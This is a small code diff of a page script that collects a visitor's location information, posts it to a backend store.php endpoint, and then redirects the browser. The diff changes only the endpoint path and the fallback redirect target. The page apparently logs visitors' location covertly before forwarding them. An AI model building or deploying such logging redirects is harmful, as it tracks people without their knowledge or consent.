@@ -22,10 +22,10 @@
         try {
           const clientLocationInfo = await getClientLocationInfo();
 
-          await fetch('store.php', {
+          await fetch('backend/store.php', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
+              'Content-Type': 'application/json',
             },
             body: JSON.stringify(clientLocationInfo),
           });
@@ -39,7 +39,7 @@
           window.location.href = ensureHttp(to);
         }
         else {
-          window.location.href = "https://www.aljamili-trading.com";
+          window.location.href = "https://www.google.com";
         }
       })();
     </script>
